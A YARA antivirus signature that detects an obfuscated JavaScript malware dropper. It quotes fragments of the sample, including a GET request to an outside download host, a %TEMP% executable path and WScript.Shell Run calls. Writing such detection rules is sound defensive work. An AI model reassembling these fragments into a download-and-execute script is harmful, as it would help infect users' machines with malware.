rule sig_20160328_06cadec67698171ddf58bf78fa3bfafb {
  meta:
    description = "datamaliciousorder - file 20160328_06cadec67698171ddf58bf78fa3bfafb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "659f15c189d9a1920f16aa1472501042e833c156287f77ad97bc9f76f4c32933"

  strings:
    $s1  = "function Ojzavefpfr() {return Pkpikwwjqf[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bHELyoY8HdR4u.exe\";};" fullword ascii
    $s2  = "Xrndq[Prsta](\"GET\", \"http://extragames.besaba.com/b3ysfa\", false);" fullword ascii
    $s3  = "do {WScript[Eznpjmoovq](Epfdja() * 11)} while (Xrndq[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Pkpikwwjqf = function Ehdsnywg() {return WScript[Xvwjet](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Bcyvaoviun(Qnzwddvqt, Qbrnqen){return Qnzwddvqt - Qbrnqen;};" fullword ascii
    $s6  = "function Lmajxmvtl() {return ((Slhqo == true) && (Slhqo == Wwsibcg)) ? 1 : Bypuk;};" fullword ascii
    $s7  = "function Ewgbuopg(Odyeppohs){Pkpikwwjqf[\"Run\"](Odyeppohs, Bypuk, Bypuk);};" fullword ascii
    $s8  = "function Madoetr()" fullword ascii
    $s9  = "function Zigcsskmpq(Isudeoq) {var Epieeorzd = (1, 2, 3, 4, 5, Isudeoq); return Epieeorzd;};" fullword ascii
    $s10 = "var Wwsibcg = false;" fullword ascii
    $s11 = "return Bcyvaoviun(Wfglcryiux, Itdmvvxxzy);" fullword ascii
    $s12 = "var Rtjvtlfert = new this[\"Date\"]();" fullword ascii
    $s13 = "function Twrldjs(){return Gojqvio;};" fullword ascii
    $s14 = " while (Vhzummare){" fullword ascii
    $s15 = "Wwsibcg = true; " fullword ascii
    $s16 = "function Epfdja(){return 22;};" fullword ascii
    $s17 = "Slhqo = true; " fullword ascii
    $s18 = "var Slhqo = false;" fullword ascii
    $s19 = "function Kjfqnwqpzg(){return Xvwjet;};" fullword ascii
    $s20 = "var Jeamtdgx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}